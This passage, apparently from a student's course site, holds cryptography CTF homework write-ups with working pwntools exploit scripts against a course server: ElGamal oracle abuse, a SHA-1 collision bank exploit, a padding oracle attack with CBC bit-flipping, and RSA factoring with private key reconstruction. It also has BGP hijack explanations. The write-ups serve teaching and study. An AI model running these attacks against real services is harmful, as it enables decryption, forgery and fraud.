CNS{n0_r3us3d_3ph3m3ra1_K3Y!}\n6-2(Bonus)\n6-3 Assume: $$m_n={c_1}^{f(n)}\\ (mod\\ self.P),\\ n\\in{1,\u0026hellip;,5}$$where $self.P$ is a group defined by author, $c_1$ is the user-chosen string that should be decrypted So, I can put each of the response from the server into Lagrange Interpolation Formula, that is $$ \\begin{aligned} f(x)\u0026amp;=ax^4+bx^3+cx^2+dx+sk\\ \u0026amp;=f(1){(x-x_2)(x-x_3)(x-x_4)(x-x_5) \\over (x_1-x_2)(x_1-x_3)(x_1-x_4)(x_1-x_5)} \\ \u0026amp;+ f(2){(x-x_1)(x-x_3)(x-x_4)(x-x_5) \\over (x_2-x_1)(x_2-x_3)(x_2-x_4)(x_2-x_5)} \\ \u0026amp;+ f(3){(x-x_1)(x-x_2)(x-x_4)(x-x_5) \\over (x_3-x_1)(x_3-x_2)(x_3-x_4)(x_3-x_5)} \\ \u0026amp;+ f(4){(x-x_1)(x-x_2)(x-x_3)(x-x_5) \\over (x_4-x_1)(x_4-x_2)(x_4-x_3)(x_4-x_5)} \\ \u0026amp;+ f(5){(x-x_1)(x-x_2)(x-x_3)(x-x_4) \\over (x_5-x_1)(x_5-x_2)(x_5-x_3)(x_5-x_4)} \\end{aligned} $$ Then if we wonder $sk$ at the constant of the formula, we can put $x=0,\\ x_1=1,\\ x_2=2,\\ x_3=3,\\ x_4=4,\\ x_5=5$ into function, that is $$f(0)=5f(1)-10f(2)+10f(3)-5f(4)+f(5)=sk$$\n$$c_1^{sk}=m_1^5*inverse(m_2^{10},\\ self.P)*m_3^{10}*inverse(m_4^5,\\ self.P)*m_5$$\n:::info Note that, we can set $c_1=C1$ which is one return value from ElGamal Encryption: ${C1, C2} \\leftarrow en_{ElGamal}(randomeNumber, message)$ :::\nSo, the flag is: $$ \\begin{aligned} flag \u0026amp;= C2*[inverse(C1, self.P)]^{sk}\\ % \\ self.P\\ \u0026amp;= C2*[inverse(C1^{sk}, self.P)]\\ % \\ self.P \\ \u0026amp;= C2*[inverse(c_1^{sk}, self.P)]\\ % \\ self.P \\end{aligned} $$ :::spoiler 6-3 source code\nfrom pwn import * from Crypto.Util.number import bytes_to_long, long_to_bytes from Crypto.Util.number import inverse r = remote(\u0026#39;cns.csie.org\u0026#39;, 6003) context.arch = \u0026#39;amd64\u0026#39; r.recvuntil(b\u0026#34;P = \u0026#34;) p = int(r.recvline().strip().decode()) r.recvuntil(b\u0026#34;g = \u0026#34;) g = int(r.recvline().strip().decode()) r.recvuntil(b\u0026#34;cipher = (\u0026#34;) c1 = int(r.recvuntil(b\u0026#34;, \u0026#34;).decode().replace(\u0026#34;, \u0026#34;, \u0026#34;\u0026#34;)) c2 = int(r.recvuntil(b\u0026#34;)\\n\u0026#34;).decode().replace(\u0026#34;)\\n\u0026#34;, \u0026#34;\u0026#34;)) log.info(\u0026#34;P = {}\u0026#34;.format(p)) log.info(\u0026#34;g = {}\u0026#34;.format(g)) log.info(\u0026#34;c1 = {}\u0026#34;.format(c1)) log.info(\u0026#34;c2 = {}\u0026#34;.format(c2)) message_user_input = str(c1) m = [] # print(r.recvline()) for i in range(1, 6): r.recvuntil(b\u0026#39;Do you want to decrypt something? (y/n): \u0026#39;) r.sendline(b\u0026#39;y\u0026#39;) r.recvuntil(b\u0026#39;Give me your c1: \u0026#39;) r.sendline(message_user_input.encode()) r.recvuntil(b\u0026#39;(1~5): \u0026#39;) # r.recvline() r.sendline(str(i).encode()) m.append(int(r.recvline().decode())) log.info(\u0026#34;m{} = {}\u0026#34;.format(i, m[-1])) tmp = ((m[0]**5)*inverse(m[1]**10, p)*(m[2]**10)*inverse(m[3]**5, p)*m[4]) % p flag = bytes.fromhex(long_to_bytes((c2 * inverse(tmp, p)) % p).hex().replace(\u0026#34;0x\u0026#34;, \u0026#34;\u0026#34;)).decode(\u0026#39;utf-8\u0026#39;) log.info(flag) r.close() :::\nFlag 6-3: CNS{l4gr4ng3_P0lyn0m14L_12_s0_34SY} :::danger It may not work sometimes, so, please re-run it again :::\n7. Bank # Recon # If I register an account, I earn $10. In addition, If the register name contain I love CNS, I can earn $15 that $5 for extra. Obviously, I should find SHA-1 collision for earning extra money to buy the flag. The main flow is like:\nFind a string that have SHA-1 collision(assume A and B) Register A account and login to earn $10 then logout Register B account Login by B account At this moment, the money will be saved in A account due to collision Then logout and re-login A account and buy the flag(now A account should have $20) Essential Source Code # ... match cmd: case 1: # register username = input_untruncated(\u0026#34;Username: \u0026#34;).strip(b\u0026#34;\\n\u0026#34;) if username in keys: print(\u0026#34;The username already used, try another\u0026#34;) continue key = keys[username] = random.randbytes(16) print( f\u0026#34;Here is your passkey, store it in a safe place: {base64.b64encode(key).decode()}\u0026#34; ) h = sha1(username) balances[h] += NEW_USER_GIFT if b\u0026#34;I love CNS\u0026#34; in username: # good students get bonus balances[h] += CNS_LOVER_BONUS ... Exploit # Just find the collision of SHA-1 :::spoiler source code ```python from pwn import *\ncontext.arch = 'amd64' for i in range(2): # r = process('./server.py') r = remote('cns.csie.org', 44377) magic1 = open('shattered-1.pdf', 'rb').read() + b'I love CNS' magic2 = open('shattered-2.pdf', 'rb').read() + b'I love CNS' '''Register \u0026quot;I love CNS and get the passkey\u0026quot;''' r.recvuntil(b'Your choice: ') r.sendline(b'1') r.recvuntil(b'Username: ') r.sendline(magic1) passkey = r.recvline().decode('utf-8').split(': ')[1].replace('\\n', '') log.info(\u0026quot;Normal account passkey: {}\u0026quot;.format(passkey)) '''Register another account that has same sha1 value with previous one''' r.recvuntil(b'Your choice: ') r.sendline(b'1') r.recvuntil(b'Username: ') r.sendline(magic2) passkey_collision = r.recvline().decode('utf-8').split(': ')[1].replace('\\n', '') log.info(\u0026quot;Collision account passkey: {}\u0026quot;.format(passkey_collision)) '''Login Normal Account and Get money''' r.recvuntil(b'Your choice: ') r.sendline(b'2') r.recvuntil(b'Username: ') r.sendline(magic1) r.recvuntil(b'Passkey in Base64: ') r.sendline(passkey.encode()) '''Logout''' r.recvuntil(b'Your choice: ') r.sendline(b'1') '''Login Collision Account''' r.recvuntil(b'Your choice: ') r.sendline(b'2') r.recvuntil(b'Username: ') r.sendline(magic2) r.recvuntil(b'Passkey in Base64: ') r.sendline(passkey_collision.encode()) '''Logout''' r.recvuntil(b'Your choice: ') r.sendline(b'1') '''Login Normal Account and Get money''' r.recvuntil(b'Your choice: ') r.sendline(b'2') r.recvuntil(b'Username: ') r.sendline(magic1) r.recvuntil(b'Passkey in Base64: ') r.sendline(passkey.encode()) r.recvuntil(b'You have $') money = r.recvline().decode().split(\u0026quot; \u0026quot;)[0] log.info(\u0026quot;Your money is: {}\u0026quot;.format(money)) r.recvuntil(b'Your choice: ') if i == 0: r.sendline(b'2') r.recvuntil(b'Here is your flag 1:') flag1 = r.recvline().strip().decode() log.info(\u0026quot;Flag1: {}\u0026quot;.format(flag1)) elif i == 1: r.sendline(b'3') r.recvuntil(b'Here is your flag 2:') flag2 = r.recvline().strip().decode() log.info(\u0026quot;Flag2: {}\u0026quot;.format(flag2)) r.close() r.interactive() ``` ::: Flag 7-1: CNS{ha$h_i5_m15used} Flag 7-2: CNS{$ha1_15_n0t_c0ll1510n_r3s1st@nt}\n8. Clandestine Operation # Recon # Encrypted by AES Mode: CBC Padding type: PKCS#7 Padding Oracle Attack ::: spoiler Seems padding oracle menus.py/askNahida() ... if choice == 1: ID = input(\u0026#39;Please give me the ID (hex encoded): \u0026#39;).strip() try: decrypt(ID) print(\u0026#39;Hint: It seems feasible...\u0026#39;) except Exception as e: if e.__class__.__name__ == \u0026#39;UnicodeDecodeError\u0026#39;: print(\u0026#39;Hint:\u0026#39;, \u0026#39;Not a valid ID...\u0026#39;) else: print(\u0026#39;Hint:\u0026#39;, e) ... cryptoFunc.py def unpad(c): length = c[-1] for char in c[-length:]: if char != length: raise paddingError(\u0026#39;incorrect padding\u0026#39;) return c[:-length] def decrypt(c): aes = AES.new(secret.key, AES.MODE_CBC, secret.iv) return unpad(aes.decrypt(binascii.unhexlify(c))).decode() ... ::: Exploit # Just padding oracle attack :::spoiler 8-1 source code\nfrom pwn import * from tqdm import trange from itertools import cycle r = remote(\u0026#39;cns.csie.org\u0026#39;, 44399) context.arch = \u0026#39;amd64\u0026#39; r.recvuntil(b\u0026#39;Your choice:\u0026#39;) r.sendline(b\u0026#39;2\u0026#39;) def test_validity(response, error): padding_correct = True if error != response else False return padding_correct def split_len(seq, length): return [seq[i : i + length] for i in range(0, len(seq), length)] def block_search_byte(size_block, i, pos, l): # If ct_pos = 10 and # i = 0 return: 0000000000000000000000000000000a # i = 1 return: 00000000000000000000000000000a # i = 2 return: 000000000000000000000000000a # ... # i = 15 return: 0a hex_char = hex(pos).split(\u0026#34;0x\u0026#34;)[1] return (\u0026#34;00\u0026#34; * (size_block - (i + 1)) + (\u0026#34;0\u0026#34; if len(hex_char) % 2 != 0 else \u0026#34;\u0026#34;) + hex_char + \u0026#34;\u0026#34;.join(l)) def block_padding(size_block, i): # It\u0026#39;ll return # \u0026#39;00000000000000000000000000000001\u0026#39; # \u0026#39;00000000000000000000000000000202\u0026#39; # \u0026#39;00000000000000000000000000030303\u0026#39; # ... # \u0026#39;10101010101010101010101010101010\u0026#39; l = [] for t in range(0, i + 1): l.append((\u0026#34;0\u0026#34; if len(hex(i + 1).split(\u0026#34;0x\u0026#34;)[1]) % 2 != 0 else \u0026#34;\u0026#34;) + (hex(i + 1).split(\u0026#34;0x\u0026#34;)[1])) return \u0026#34;00\u0026#34; * (size_block - (i + 1)) + \u0026#34;\u0026#34;.join(l) def hex_xor(s1, s2): b = bytearray() for c1, c2 in zip(bytes.fromhex(s1), cycle(bytes.fromhex(s2))): b.append(c1 ^ c2) return b.hex() def call_oracle(tmp_ID): r.recvuntil(b\u0026#39;Your choice:\u0026#39;) r.sendline(b\u0026#39;1\u0026#39;) r.recvuntil(b\u0026#39;Please give me the ID (hex encoded): \u0026#39;) # print(tmp_ID) r.sendline(tmp_ID.encode()) return r.recvline().strip().decode() cipher = \u0026#39;70309f98653e87df804263d5a0348f115c36bc7c2cddfe02ffd44528083635404815ed8c0f14ad8cbbb1c7bc12bf21725fa15c0e7ba326e433ec41ddfaf41d27aa18ce4381a61d187ecbdcc9740747d300b7f354bb68139f2306508a06a04fbe\u0026#39; found = False valide_value = [] result = [] size_block = 16 len_block = size_block * 2 cipher_block = split_len(cipher, len_block) error = \u0026#39;Hint: PADDING ERROR : incorrect padding\u0026#39; if len(cipher_block) == 1: print(\u0026#34;[-] Abort there is only one block\u0026#34;) sys.exit() # for each cipher_block for block in reversed(range(1, len(cipher_block))): if len(cipher_block[block]) != len_block: print(\u0026#34;[-] Abort length block doesn\u0026#39;t match the size_block\u0026#34;) break print(\u0026#34;[+] Search value block : \u0026#34;, block, \u0026#34;\\n\u0026#34;) # for each byte of the block for i in range(0, size_block): # test each byte max 255 for ct_pos in range(0, 256): # 1 xor 1 = 0 or valide padding need to be checked if ct_pos != i + 1 or ( len(valide_value) \u0026gt; 0 and int(valide_value[-1], 16) == ct_pos ): bk = block_search_byte(size_block, i, ct_pos, valide_value) bp = cipher_block[block - 1] bc = block_padding(size_block, i) tmp = hex_xor(bk, bp) # print(bk) cb = hex_xor(tmp, bc) if block == 5: up_cipher = cipher_block[0] + cipher_block[1] + cipher_block[2] + cipher_block[3] + cb + cipher_block[5] elif block == 4: up_cipher = cipher_block[0] + cipher_block[1] + cipher_block[2] + cb + cipher_block[4] elif block == 3: up_cipher = cipher_block[0] + cipher_block[1] + cb + cipher_block[3] elif block == 2: up_cipher = cipher_block[0] + cb + cipher_block[2] else: up_cipher = cb + cipher_block[1] # we call the oracle, our god response = call_oracle( up_cipher ) if test_validity(response, error): found = True print(up_cipher) # data analyse and insert in right order value = re.findall(\u0026#34;..\u0026#34;, bk) valide_value.insert(0, value[size_block - (i + 1)]) bytes_found = \u0026#34;\u0026#34;.join(valide_value) if ( i == 0 and int(bytes_found, 16) \u0026gt; size_block and block == len(cipher_block) - 1 ): print( \u0026#34;[-] Error decryption failed the padding is \u0026gt; \u0026#34; + str(size_block) ) sys.exit() print( \u0026#34;\\033[36m\u0026#34; + \u0026#34;\\033[1m\u0026#34; + \u0026#34;[+]\u0026#34; + \u0026#34;\\033[0m\u0026#34; + \u0026#34; Found\u0026#34;, i + 1, \u0026#34;bytes :\u0026#34;, bytes_found, ) print(\u0026#34;\u0026#34;) break if found == False: # lets say padding is 01 for the last byte of the last block (the padding block) if len(cipher_block) - 1 == block and i == 0: value = re.findall(\u0026#34;..\u0026#34;, bk) valide_value.insert(0, \u0026#34;01\u0026#34;) else: print(\u0026#34;\\n[-] Error decryption failed\u0026#34;) result.insert(0, \u0026#34;\u0026#34;.join(valide_value)) hex_r = \u0026#34;\u0026#34;.join(result) print(\u0026#34;[+] Partial Decrypted value (HEX):\u0026#34;, hex_r.upper()) padding = int(hex_r[len(hex_r) - 2 : len(hex_r)], 16) print( \u0026#34;[+] Partial Decrypted value (ASCII):\u0026#34;, bytes.fromhex(hex_r[0 : -(padding * 2)]).decode(), ) sys.exit() found = False result.insert(0, \u0026#34;\u0026#34;.join(valide_value)) valide_value = [] print(\u0026#34;\u0026#34;) hex_r = \u0026#34;\u0026#34;.join(result) print(\u0026#34;[+] Decrypted value (HEX):\u0026#34;, hex_r.upper()) padding = int(hex_r[len(hex_r) - 2 : len(hex_r)], 16) print(\u0026#34;[+] Decrypted value (ASCII):\u0026#34;, bytes.fromhex(hex_r[0 : -(padding * 2)]).decode(),) r.interactive() :::\nFlag 8-1: CNS{Aka_BIT_f1ipp1N9_atTaCk!}\nIn plaintext of 69... block, we need to tamper specific bytes like(Cyno $\\to$ Azar). We can xor the previous ciphertext block(5c...)\n\u0026gt;\u0026gt;\u0026gt; m1 = \u0026#39;Cyno\u0026#39;.encode(\u0026#39;utf-8\u0026#39;).hex() \u0026gt;\u0026gt;\u0026gt; m2 = \u0026#39;Azar\u0026#39;.encode(\u0026#39;utf-8\u0026#39;).hex() \u0026gt;\u0026gt;\u0026gt; hex(int(m1,16)^int(m2,16)) \u0026#39;0x2030f1d\u0026#39; \u0026gt;\u0026gt;\u0026gt; hex(int(\u0026#39;28083635\u0026#39;,16)^int(\u0026#39;2030f1d\u0026#39;,16)) \u0026#39;0x2a0b3928\u0026#39; So, the xor_patch is 0x2030f1d that we have to xor to the cipher block, 5c.... And we got\n:::spoiler 8-2 source code\nfrom pwn import * from tqdm import trange from itertools import cycle from tqdm import trange r = remote(\u0026#39;cns.csie.org\u0026#39;, 44399) context.arch = \u0026#39;amd64\u0026#39; r.recvuntil(b\u0026#39;Your choice:\u0026#39;) r.sendline(b\u0026#39;1\u0026#39;) r.recvuntil(b\u0026#39;Please speak out the secret word: \u0026#39;) r.sendline(b\u0026#39;CNS{Aka_BIT_f1ipp1N9_atTaCk!}\u0026#39;) # Try to find the magic number to fit the decryption decode process properly # for i in trange(0, 2**16): # r.recvuntil(b\u0026#39;Your choice:\u0026#39;) # r.sendline(b\u0026#39;1\u0026#39;) # r.recvuntil(b\u0026#39;Please enter your ID (hex encoded): \u0026#39;) # ID_prefix = \u0026#39;70309f98653e87df804263d5a0348f11\u0026#39; # ID_fake_1 = \u0026#39;{0:0\u0026gt;4x}\u0026#39;.format(i) # ID_fake_2 = \u0026#39;bc7c2cddfe02ffd445\u0026#39; #5C36 # # print(ID_fake_2) # ID_fake_3 = \u0026#39;2a0b392840\u0026#39; # XOR_Patch # ID_postfix = \u0026#39;4815ed8c0f14ad8cbbb1c7bc12bf21725fa15c0e7ba326e433ec41ddfaf41d27aa18ce4381a61d187ecbdcc9740747d300b7f354bb68139f2306508a06a04fbe\u0026#39; # r.sendline((ID_prefix + ID_fake_1 + ID_fake_2 + ID_fake_3 + ID_postfix).encode()) # response = r.recvline().strip().decode() # # print(response) # if \u0026#39;Authentication failed\u0026#39; not in response and i != 23606: # log.info(\u0026#34;The magic number is: {}\u0026#34;.format(i)) # print(ID_prefix + ID_fake_1 + ID_fake_2 + ID_fake_3 + ID_postfix) # print(response) # break \u0026#39;\u0026#39;\u0026#39; The magic number is 11065(Decimal) \u0026#39;\u0026#39;\u0026#39; r.recvuntil(b\u0026#39;Your choice:\u0026#39;) r.sendline(b\u0026#39;1\u0026#39;) r.recvuntil(b\u0026#39;Please enter your ID (hex encoded): \u0026#39;) ID_prefix = \u0026#39;70309f98653e87df804263d5a0348f11\u0026#39; ID_fake_1 = \u0026#39;{0:0\u0026gt;4x}\u0026#39;.format(11065) ID_fake_2 = \u0026#39;bc7c2cddfe02ffd445\u0026#39; #5C36 ID_fake_3 = \u0026#39;2a0b392840\u0026#39; # XOR_Patch ID_postfix = \u0026#39;4815ed8c0f14ad8cbbb1c7bc12bf21725fa15c0e7ba326e433ec41ddfaf41d27aa18ce4381a61d187ecbdcc9740747d300b7f354bb68139f2306508a06a04fbe\u0026#39; r.sendline((ID_prefix + ID_fake_1 + ID_fake_2 + ID_fake_3 + ID_postfix).encode()) r.recvline() flag = r.recvline().strip().decode().split(\u0026#39;. \u0026#39;)[-1] log.info(\u0026#34;flag = {}\u0026#34;.format(flag)) :::\nFlag 8-2: CNS{W15h_y0U_hav3_a_n1c3_d@y!}\nReference # Multi-prime RSA # 多素数RSA系统简介 Why should the primes used in RSA be distinct? 利用CRT加速RSA解密 What is multi-prime RSA (RSA-MP)?\nClassic # MAC訊息驗證碼 密碼雜湊函式 Diffie-Hellman Linux匹配文字grep指令用法教學與範例 How can I split multiple joined words? subprocess \u0026mdash; Subprocess management How to Check SHA1 Hash of a String\nElGamal Cryptosystem # Known plaintext attack on ElGamal encryption\nBank # 長度擴充攻擊 | Length Extension Attack (LEA) SHA-1 psuedo code LEA-CTF實例 HashPump教學 淺談HASH長度擴充攻擊 SHA-1 is a Shambles\nClandestine Operation: # Padding Oracle Attack - github [2022 fall] 0923 Crypto\n"},{"id":58,"href":"/security/course/ntu-cns/homework/cryptography-and-network-security--homework-2/","title":"Cryptography and Network Security – Homework 2","section":"Securities","content":" Cryptography and Network Security – Homework 2 # tags: NTUCNS # :::spoiler TOC [TOC] ::: Student ID: R11921A16 Name: 何秉學\nHandwriting # 1. SYN Cookies # Ans: This strategy involves the creation of a cookie by the server. In order to avoid the risk of dropping connections when the backlog has been filled, the server responds to each connection request with a SYN-ACK packet but then drops the SYN request from the backlog, removing the request from memory and leaving the port open and ready to make a new connection. If the connection is a legitimate request, and a final ACK packet is sent from the client machine back to the server, the server will then reconstruct (with some limitations) the SYN backlog queue entry. While this mitigation effort does lose some information about the TCP connection, it is better than allowing denial-of-service to occur to legitimate users as a result of an attack.\nAns: The timestamp is used to ensure that the cookie is valid and has not expired. When a server generates a SYN-ACK packet with a cookie, it includes a timestamp that indicates the time when the packet was sent. The client must respond with an ACK packet that includes the same timestamp value. If the timestamp is too old, the server will reject the connection request.\nThe client\u0026rsquo;s IP address is also included in the cookie as a way to prevent attackers from using previously generated cookies to establish connections. Since the client\u0026rsquo;s IP address is included in the cookie, it is specific to that particular client and cannot be used by other clients. If an attacker tries to use a previously generated cookie, the server will reject the connection request since the client\u0026rsquo;s IP address in the cookie will not match the IP address of the attacker.\nAns: A MAC provides both message integrity and authenticity, whereas a hash function only provides message integrity. This means that a MAC can not only detect if a message has been tampered with, but also confirm that the message was sent by the expected sender.\nIn the context of SYN cookies, using a MAC to generate a unique code ensures that the cookie is not only secure from tampering or modification but also that it is authentic and generated by the expected server. This provides an extra layer of security against attackers who may attempt to spoof the server\u0026rsquo;s identity and generate fake cookies.\nAnother advantage of using a MAC is that it is more resistant to key recovery attacks compared to hash functions. Key recovery attacks involve attempting to recover the secret key used by the hash function or MAC, which can allow an attacker to generate valid cookies. MACs are typically more secure than hash functions because they use a more complex process to generate the code, making it more difficult for an attacker to recover the key.\n2. BGP # Ans: In this case, AS 999 should announce the longer IP prefix than the target(AS 1000), e.g. 10.10.220.0/23 so that BGP will choose the longer one as the packets route path\nWe can review the example in class that talked about China Telecom intercepted 15% of IP prefixes using prefix hijacking:\nDecision 1: AT\u0026amp;T (AS 7018) chooses to route to China Telecom. In Figure 2, AT\u0026amp;T (AS 7018) has two available paths to the prefix. However, since the path advertised by China Telecom (AS 4134) is shorter, AT\u0026amp;T (AS 7018) chooses to route to China Telecom.\nDecision 2: Level 3 (AS 3356) chooses not to route to China Telecom. In order for traffic to leave China Telecom’s network and flow on to the intended destination, China Telecom requires a neighbor that does not choose the path it advertises. In the example above, this occurs when Level 3 (AS 3356) chooses to route through its customer Verizon (AS 6167) instead of through its peer China Telecom (AS 4134). Thus, China Telecom can send traffic towards Level 3 and have it arrive at the intended destination.\na)Ans: In this case, AS 999 first announced the shorter AS-path so that all of the packets would choose AS 999 as their next station. Second, in order to leave AS 999 network and flow on to the intended destination, it requires a neighbor that does not choose the path it advertises. In this example, this occurs when AS 2 chooses to route through its customer AS 1 instead of through its peer AS 999. Thus, AS 999 can send traffic towards AS 2 and have it arrive at the intended destination The update message is like {10.10.220.0/22, [AS 999, AS 998, AS 998]}\nb)Ans:\nPath prepending can be used to influence traffic to take a longer, less desirable path. An attacker can add extra instances of their own AS number to their advertised routes, making them appear less attractive to other ASs. This can cause traffic to flow through other paths that the attacker controls, allowing them to monitor or manipulate the traffic.\nLoop prevention can be exploited by attackers to create routing loops intentionally. By manipulating BGP announcements, an attacker can create a situation where routing loops occur, causing network congestion or even network outages.\nAns:\nOne of the advantage is enhances security: The maximum prefix limit can reduce the threat of BGP hijacking and routing errors to network security by preventing unnecessary routing information from entering the network. But it still exist some disadvantage, such as it may block legitimate routing information: In some cases, legitimate routing information may be misidentified as illegitimate routing information and blocked. For example, some networks may have a large number of BGP prefixes that exceed the maximum prefix limit, and these prefix information may be misidentified as illegitimate and blocked. 3. Knowing What I Am, Not Knowing Who I Am # The whole workflow is as below:\nwhere $c_m=E_{pkm}(w;r_m)\\ \\forall\\ i\\ \\in {1,\u0026hellip;,l}$ and $w\u0026rsquo;=D_{ski}(c_i)$\nAns: $$ \\begin{aligned} Pr[Exp_{\\pi ,A, l}^{anon}(n)=1]\u0026amp;=Pr[j=i|cheat_s=0] \\ \u0026amp;=Pr[j=i|c_m=E_{pkm}(w;r_m)\\ \\forall\\ m\\ \\in\\ {1,\u0026hellip;,l}]\\ \u0026amp;=Pr[j=i|c_m\\oplus E_{pkm}(w;r_m)=0\\ \\forall\\ m\\ \\in\\ {1,\u0026hellip;,l}]\\ \u0026amp;=Pr[j\\oplus i=0|c_m\\oplus E_{pkm}(w;r_m)=0\\ \\forall\\ m\\ \\in\\ {1,\u0026hellip;,l}]\\ \\end{aligned} $$ If the adversarial server $S$ used the same random number $w$ to encrypt each ciphertext, then the given condition in this probability will not affect the result, that is the given condition is not associate to guessing result $j$. So, the probability of the statement will be equal to $Pr[j\\oplus i=0]\\le {1\\over l}$\nAns: In my perspective, we can refer to k-anonymity to split $k$ users that has the same attributes as a group. In addition, they can share the same public/private key to decrypt the ciphertext or verified the adversarial server is cheating or not. Then the complexity of the verified process can be more efficiency, i.e. $O(l\\over k)$ where there\u0026rsquo;re $l$ users and each group has $k$ users that has similar attributes.\nAns: 這一題的假設是讓user自己生產自己的public key然後上傳到server供其他人下載嗎?想不出來\nCTF # 4. TLS # Recon # What if the two prime factors p and q of an RSA modulus n are too close to each other? :::info Note that Ncat does not support TLS, so you may need to use other tools like OpenSSL to establish a connection to the server. $ openssl s_client -connect cns.csie.org:12345 :::\nTry to factorize public key by using online tool\nnp=27171899387582994630080241635149110083271663600309412521746050077768885906315627389853968666978344583062190025422406556299962462577371938126502805594063354420813465504379781719813559864324424860667828794143342554880661764085821586961603756682754593972938581924631795195026434529901154406060011099096550054692948775946026202445725528280139742483813426388247330680581603463449714704030064353339761917890699417992071180183947964103967284932770956957844989073082639407508192226568377226601600813327551969255729045779934469524197423719313463774332606735758556445171050839176603767275802969849771354230198787362147064261141 q=27171899387582994630080241635149110083271663600309412521746050077768885906315627389853968666978344583062190025422406556299962462577371938126502805594063354420813465504379781719813559864324424860667828794143342554880661764085821586961603756682754593972938581924631795195026434529901154406060011099096550054692948775946026202445725528280139742483813426388247330680581603463449714704030064353339761917890699417992071180183947964103967284932770956957844989073082639407508192226568377226601600813327551969255729045779934469524197423719313463774332606735758556445171050839176603767275802969849771354230298787362147064261753 Construct private key\n\u0026gt;\u0026gt;\u0026gt; from Crypto.Util.number import inverse \u0026gt;\u0026gt;\u0026gt; p=27171899387582994630080241635149110083271663600309412521746050077768885906315627389853968666978344583062190025422406556299962462577371938126502805594063354420813465504379781719813559864324424860667828794143342554880661764085821586961603756682754593972938581924631795195026434529901154406060011099096550054692948775946026202445725528280139742483813426388247330680581603463449714704030064353339761917890699417992071180183947964103967284932770956957844989073082639407508192226568377226601600813327551969255729045779934469524197423719313463774332606735758556445171050839176603767275802969849771354230198787362147064261141 \u0026gt;\u0026gt;\u0026gt; q = 27171899387582994630080241635149110083271663600309412521746050077768885906315627389853968666978344583062190025422406556299962462577371938126502805594063354420813465504379781719813559864324424860667828794143342554880661764085821586961603756682754593972938581924631795195026434529901154406060011099096550054692948775946026202445725528280139742483813426388247330680581603463449714704030064353339761917890699417992071180183947964103967284932770956957844989073082639407508192226568377226601600813327551969255729045779934469524197423719313463774332606735758556445171050839176603767275802969849771354230298787362147064261753 \u0026gt;\u0026gt;\u0026gt; phi_n = (p-1)*(q-1) \u0026gt;\u0026gt;\u0026gt; inverse(65537, phi_n) 471182755778531633837595254982392912025203887450675396173052859951517226327308287900569077573364523920057914854393577740186889850202056700205386190405605462108974792901403115381842095468788204747698304697390945163288343872000620563081945267258671474601542919120102730194721238439211991571325691228395891189282500624319258308667980205186674536584717833266977397744127443006730525078605511941645755885134412912779841630021416603114887877542810924836148144149072482784493014142576398535481803211441860774359442834382450586896485662461769369027933268431598257015049427650623765345072281579244866783437350396619862565737627763575514488335944795541995433605729652918306987153468955004556117838020882436357536473693421452686248238163534518808971680955943532476013599759458268294381520872799953359615598298222319020925397677745581907581310692655121309300095562888539980842742239635926584038343456014891878918451322001100154737187176145201686105552229473727339669113582294232621679208173518946872148410645516312281953157344683484963494463304752322686067736852981814079919012126538862044280554201637714290133745624435881055700349008833523600149235721690153645535830972099526514511047334339269312883123405652148571373677266783312996648420101473 Construct Pem File - Refer to this page\n\u0026gt;\u0026gt;\u0026gt; from Crypto.PublicKey import RSA \u0026gt;\u0026gt;\u0026gt; n = 0xb4f98200f1309e8a486824051051ac80790f8e66dac4744e2ce5134fb432121f41c5471e3459d01e56e64befd2034c65eb300ebf0045342221bff206b6cdda7f3349c17b08563a576731f95a64e2f00af70b5cbb2f4f388d49ce82da76ca609a6ec1529f29b0fa0bedc5764b86472e2c5ac5198cedb6f5e1e8e0ca950ea11bc4cf5e5a0497db3ad96f5a745cf902d56be394a259068fe198bc9de8fe8d034a71013f46c2ac72451211eb1127286c19467eaf3a10049942d46b0f49f3c51c01c06a2f8c94416cc1aadaeb191de959f0241ce8f32575c848bd2f4f8f84dab46e2aa7ad45de1c6060fbbee9668f8e9cb6d366b8cd6ce99f78bbef145f2b7b7e5222f762ccb95f17b1538260c2ea45571061b0d873fbe60d61dd87aa4833ac71b802f2b91d30f38e30ae9da39fbd1c53e80496f511521285b3bb1da3dc79931463d278d1fe28a77880a9f2368029c4cefffebbbd6904f85291b3606d0b5ed3efd8c1ee14538dc051274665f4b0f55d6c6e12d2cb728ac15f7a6572b71a5bd6fa01bddb0af211091bff4c8ec7e93efae4654b2abae09e35be29afbfc3f4df8e4348c525b9d8662a1ac344dadb15b953905f639b48fec7cfcfdf27cc0ad82b936d5efe7c0d891bf9752d3fb0857d38337df033e4b681d19ec8603535504d05a421036c077694482eee919a44b3296e2a4c272cbf7bbf14b6d62eb194e4ee83ba227fed \u0026gt;\u0026gt;\u0026gt; e = 0x10001 \u0026gt;\u0026gt;\u0026gt; d = 0x737efcd1df1b7942a53d1927c62769a0c022066e6bd58ea8498c948b7c63ac1f18996f6ebe584732e5a0a9fbce9ade49f913bd857605b464c80738cdc22293fc33de314574a79b2a26a8c50b447174627b115c47f5c46841fb45794b351ea91245f6c8e4dcf59e4eb89b1988cf9463ca58cf8b23de9db2444f9c0e8d9c3d837c521f53f1b47c6c0d523c7720d2a655503a78a4378eb18a773080d2ae898dfd172b8597822c0ded38c008b5f4b89e6c6f09f0886caa92a90ce99a6346d897ac2281620124a8b060d4ca4bd9c6b622f8d8033f43d5b75a6fd994f50091f805c87d1e6fbdb42785f6bf1332df8a64a86d21736023720b9303b964b62a9a9480a4a7ab5fac794f583109d5663998ccc893590ebe26ae076e17c2b93c2238106612094fd4c6a56ec84ca5fa6ee3608ba3422f931828772e6732c337fcd6d4e6cb4a907d2e978227423d783c112f7a7d3e6d7c91ac7c540f0095d39842a6be534321a67d7a3fcb1c62c0f9e8a6d6e10281e10ff957449770d19f939153692c73f940450eab03f58ef55d2adf98c3f8479d05bb02997667381d3583c8f0eba6ea91bce512b001a27788309a4aa15952c73572a329b2f3acd6a11f43e3ae00532ccfbe9f157702162b534d26ca1e668d4cdbfd0116b7cb724603ea99e8aa08c90410534dd681b59350542c59523cb1259428e05e1fe0aab479c4b5af2a44d18ef713cd61 \u0026gt;\u0026gt;\u0026gt; p = 